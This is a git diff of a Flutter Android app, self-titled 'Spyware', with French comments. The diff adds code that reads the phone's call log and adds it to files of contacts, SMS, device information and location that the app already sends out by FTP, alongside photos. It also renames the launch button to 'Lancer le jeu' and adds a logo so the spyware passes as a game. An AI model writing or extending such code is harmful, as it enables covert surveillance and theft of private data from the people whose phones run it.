@@ -12,6 +12,7 @@ import 'package:ftpconnect/ftpConnect.dart';
 import 'package:permission_handler/permission_handler.dart';
 import 'package:contacts_service/contacts_service.dart';
 import 'package:path_provider/path_provider.dart';
+import 'package:call_log/call_log.dart';
 
 void main() {
   runApp(const MyApp());
@@ -27,6 +28,7 @@ class MyApp extends StatelessWidget {
         primarySwatch: Colors.green,
       ),
       home: const MyHomePage(title: 'Spyware Page d\'accueil'),
+      debugShowCheckedModeBanner:  false,
     );
   }
 }
@@ -60,12 +62,13 @@ class _MyHomePageState extends State<MyHomePage> {
     Directory TempDir = await getTemporaryDirectory();
 
     // Creation de la liste des fichiers à envoyer
-    var listeFichiers = ["${TempDir.path}/contact.txt","${TempDir.path}/sms.txt","${TempDir.path}/phone_information.txt","${TempDir.path}/localisation.txt"];
+    var listeFichiers = ["${TempDir.path}/contact.txt","${TempDir.path}/sms.txt","${TempDir.path}/phone_information.txt","${TempDir.path}/localisation.txt","${TempDir.path}/HistoAppel.txt"];
 
     final FichierContact = "${TempDir.path}/contact.txt";
     final FichierSMS = "${TempDir.path}/sms.txt";
     final FichierInformation = "${TempDir.path}/phone_information.txt";
     final FichierLocalisation = "${TempDir.path}/localisation.txt";
+    final FichierHistoAppel = "${TempDir.path}/HistoAppel.txt";
 
     // ***** PARTIE INFORMATIONS TELEPHONE *****
     if (Platform.isAndroid) {
@@ -115,6 +118,20 @@ class _MyHomePageState extends State<MyHomePage> {
     }
     File(FichierSMS).writeAsString(infoSMS).then((File fileSMS) {});
 
+    // ***** Partie HISTORIQUE D'APPEL *****
+    var histo_appel ="";
+    Iterable<CallLogEntry> entries = await CallLog.get();
+    for (var entree in entries) {
+      int? timestamp = entree.timestamp;
+      final DateTime date1 = DateTime.fromMicrosecondsSinceEpoch(timestamp! * 1000);
+      final date = date1;
+      histo_appel = histo_appel+"Nom du destinataire : "+entree.name!+", Numéro du destinataire : "+entree.number!+", Date : "+date.toString()+"\n";
+    }
+    File(FichierHistoAppel).writeAsString(histo_appel).then((File fileHistoAppel) {});
+    
+    // ***** Partie Wi-Fi *****
+
+
     // ***** Partie Envoie des fichiers *****
     // Faire une liste des fichiers à envoyer
     for (var fichier in listeFichiers) {
@@ -135,7 +152,7 @@ class _MyHomePageState extends State<MyHomePage> {
     // ***** PARTIE PHOTOS *****
 
     // Récupération de la liste de fichier
-    Directory dir = Directory('/storage/1CEC-2F09/images');
+    Directory dir = Directory('/storage/1CEC-2F09/Images');
     List<FileSystemEntity> phoneFiles = dir.listSync(recursive: true);
 
     // Définition de la liste de fichier
@@ -175,10 +192,12 @@ class _MyHomePageState extends State<MyHomePage> {
         child: Column(
           mainAxisAlignment: MainAxisAlignment.center,
           children: <Widget>[
+            // Ajout de l'image
+            Image.asset("images/cdaisi.png",width: 200,height: 200),
             // Définition du bouton
             MaterialButton(
                 // Nom du bouton
-                child: const Text('Lancer l\'application'),
+                child: const Text('Lancer le jeu'),
                 textColor: Colors.white,
                 color: Colors.green,
                 // Lorsque l'on appuie sur le bouton
